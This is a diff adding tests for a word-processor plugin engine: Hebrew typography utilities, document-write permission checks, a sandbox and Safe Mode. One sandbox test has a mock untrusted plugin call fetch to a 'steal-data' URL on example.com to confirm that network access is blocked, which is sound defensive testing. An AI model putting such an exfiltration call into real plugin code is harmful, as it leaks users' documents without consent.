@@ -762,3 +762,200 @@ describe('Regression: document fonts are the ones the engine embeds', () => {
   });
 });
 
+describe('Feature: Official Plugin APIs & Security Sandbox', () => {
+  test('Hebrew Typography utilities (Niqqud, Taamim, Holy Names, Quotes)', async () => {
+    const { hebrewUtils } = await loadTs('packages/tok-ui/src/plugins/hebrew-utils.ts');
+    
+    // 1. Niqqud stripping
+    const pointed = 'בָּרוּךְ אַתָּה';
+    assert.equal(hebrewUtils.stripNiqqud(pointed), 'ברוך אתה');
+
+    // 2. Ta'amim stripping
+    const withTaamim = 'בְּרֵאשִׁ֖ית בָּרָ֣א';
+    assert.equal(hebrewUtils.stripTaamim(withTaamim), 'בְּרֵאשִׁית בָּרָא');
+    assert.equal(hebrewUtils.stripAllMarks(withTaamim), 'בראשית ברא');
+
+    // 3. Holy names detection in pointed text
+    const sacred = 'בָּרוּךְ אַתָּה יהוה אֱלֹהִים מֶלֶךְ הָעוֹלָם';
+    const matches = hebrewUtils.findHolyNames(sacred);
+    assert.equal(matches.length, 2);
+    assert.equal(matches[0].name, 'יהוה');
+    assert.equal(matches[1].name, 'אלהים');
+
+    // 4. Quotation normalization (Gershayim and Geresh)
+    const quoteInput = 'לדברי הרמב"ם והראב"ד ור\' משה';
+    const quoteOutput = hebrewUtils.normalizeQuotes(quoteInput);
+    assert.equal(quoteOutput, 'לדברי הרמב״ם והראב״ד ור׳ משה');
+
+    // 5. Gematria
+    assert.equal(hebrewUtils.toHebrewGematria(1), 'א׳');
+    assert.equal(hebrewUtils.toHebrewGematria(15), 'ט״ו');
+    assert.equal(hebrewUtils.toHebrewGematria(270), 'ע״ר');
+  });
+
+  test('Document APIs enforce document:write permissions and allow safe batch mutations', async () => {
+    const { PluginEngine } = await loadTs('packages/tok-ui/src/plugins/PluginEngine.ts');
+
+    let currentStory = [
+      { id: 'p1', styleId: 'body', text: 'פסקה ראשונה' },
+      { id: 'p2', styleId: 'body', text: 'פסקה שניה' }
+    ];
+
+    const delegate = {
+      getStory: () => [...currentStory],
+      loadStory: (newStory) => { currentStory = [...newStory]; },
+      getSelectedText: () => 'טקסט נבחר',
+      replaceSelection: (t) => { currentStory[0].text = t; },
+      getDocumentTitle: () => 'מסמך בדיקה.tok',
+      getStats: () => ({ wordCount: 4, charCount: 20, paragraphCount: 2 }),
+      getViewMode: () => 'story',
+      setViewMode: () => {},
+      getPageCount: () => 1,
+      getActivePageIndex: () => 0,
+      getZoom: () => 100,
+    };
+
+    // Plugin with document:read only (should fail to write)
+    let writeError = null;
+    const readOnlyCode = `
+      function activate(tok) {
+        try {
+          tok.document.updateParagraph('p1', 'שינוי לא מורשה');
+        } catch (e) {
+          writeError = e.message;
+        }
+      }
+    `;
+
+    // Plugin with document:write (should succeed)
+    let writeSuccess = false;
+    const writeCode = `
+      function activate(tok) {
+        tok.document.updateParagraph('p1', 'טקסט מעודכן');
+        writeSuccess = true;
+      }
+    `;
+
+    globalThis.writeError = null;
+    globalThis.writeSuccess = false;
+
+    globalThis.tokIpc = {
+      getPluginSystemStatus: async () => ({ isSafeMode: false, isSaferActive: false, userPluginsDir: '' }),
+      getPlugins: async () => [
+        {
+          manifest: { id: 'ro-plugin', name: 'ReadOnly', version: '1.0', description: '', permissions: ['document:read', 'ui:notifications'] },
+          sourceType: 'js',
+          enabled: true,
+          compiledCode: 'function activate(tok){ try{ tok.document.updateParagraph("p1", "err"); }catch(e){ globalThis.writeError = e.message; } }'
+        },
+        {
+          manifest: { id: 'rw-plugin', name: 'ReadWrite', version: '1.0', description: '', permissions: ['document:read', 'document:write'] },
+          sourceType: 'js',
+          enabled: true,
+          compiledCode: 'function activate(tok){ tok.document.updateParagraph("p1", "עודכן"); globalThis.writeSuccess = true; }'
+        }
+      ]
+    };
+
+    try {
+      const engine = new PluginEngine({ delegate });
+      await engine.loadPlugins();
+
+      // Read-only plugin must be rejected by permission guard
+      assert.match(globalThis.writeError, /Permission denied.*document:write/);
+
+      // Read-write plugin must succeed
+      assert.equal(globalThis.writeSuccess, true);
+      assert.equal(currentStory[0].text, 'עודכן');
+    } finally {
+      delete globalThis.tokIpc;
+      delete globalThis.writeError;
+      delete globalThis.writeSuccess;
+    }
+  });
+
+  test('Security sandbox shadows IPC and blocks unauthorized network calls', async () => {
+    const { PluginEngine } = await loadTs('packages/tok-ui/src/plugins/PluginEngine.ts');
+
+    let capturedIpcType = 'not_run';
+    let networkBlocked = false;
+
+    globalThis.__testReport = (ipcVal, netBlocked) => {
+      capturedIpcType = ipcVal;
+      networkBlocked = netBlocked;
+    };
+
+    const untrustedCode = `
+      function activate(tok) {
+        var ipcType = typeof tokIpc;
+        var blocked = false;
+        try {
+          fetch('https://example.com/steal-data');
+        } catch (e) {
+          blocked = true;
+        }
+        globalThis.__testReport(ipcType, blocked);
+      }
+    `;
+
+    globalThis.tokIpc = {
+      getPluginSystemStatus: async () => ({ isSafeMode: false, isSaferActive: false, userPluginsDir: '' }),
+      getPlugins: async () => [
+        {
+          manifest: { id: 'untrusted', name: 'Untrusted', version: '1.0', description: '', permissions: ['ui:commands'] },
+          sourceType: 'js',
+          enabled: true,
+          compiledCode: untrustedCode
+        }
+      ]
+    };
+
+    try {
+      const engine = new PluginEngine();
+      await engine.loadPlugins();
+
+      // tokIpc must be undefined in plugin execution scope
+      assert.equal(capturedIpcType, 'undefined');
+      // fetch must be blocked because 'network:fetch' is not permitted
+      assert.equal(networkBlocked, true);
+    } finally {
+      delete globalThis.tokIpc;
+      delete globalThis.__testReport;
+    }
+  });
+
+  test('Safe Mode blocks third-party plugins from running', async () => {
+    const { PluginEngine } = await loadTs('packages/tok-ui/src/plugins/PluginEngine.ts');
+
+    let thirdPartyRan = false;
+    globalThis.__thirdPartyRun = () => { thirdPartyRan = true; };
+
+    globalThis.tokIpc = {
+      getPluginSystemStatus: async () => ({ isSafeMode: true, isSaferActive: true, userPluginsDir: '' }),
+      getPlugins: async () => [
+        {
+          manifest: { id: 'user-ext', name: 'User Ext', version: '1.0', description: '' },
+          sourceType: 'js',
+          enabled: false,
+          safeModeBlocked: true,
+          compiledCode: 'function activate(){ globalThis.__thirdPartyRun(); }'
+        }
+      ]
+    };
+
+    try {
+      const engine = new PluginEngine();
+      await engine.loadPlugins();
+
+      assert.equal(engine.getIsSafeMode(), true);
+      assert.equal(engine.getIsSaferActive(), true);
+      assert.equal(thirdPartyRan, false);
+      const list = engine.getPlugins();
+      assert.equal(list[0].safeModeBlocked, true);
+    } finally {
+      delete globalThis.tokIpc;
+      delete globalThis.__thirdPartyRun;
+    }
+  });
+});
+
